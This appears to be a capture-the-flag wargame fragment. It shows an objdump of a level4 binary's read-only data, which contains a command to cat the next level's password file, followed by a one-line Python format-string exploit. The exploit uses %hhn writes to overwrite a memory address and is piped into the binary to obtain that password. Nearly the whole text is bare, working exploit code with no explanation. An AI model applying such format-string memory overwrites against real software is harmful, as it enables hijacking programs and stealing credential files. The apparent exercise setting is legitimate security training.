Contents of section .rodata:
 8048588 03000000 01000200 2f62696e 2f636174  ......../bin/cat
 8048598 202f686f 6d652f75 7365722f 6c657665   /home/user/leve
 80485a8 6c352f2e 70617373 00                 l5/.pass.

(python -c 'import struct; m=0x8049810; payload=struct.pack("<I",m+3)+struct.pack("<I",m+2)+struct.pack("<I",m)+struct.pack("<I",m+1)+"%241c%12$hhn%1c%13$hhn%66c%14$hhn%17c%15$hhn"; print(payload)'; cat) | ./level4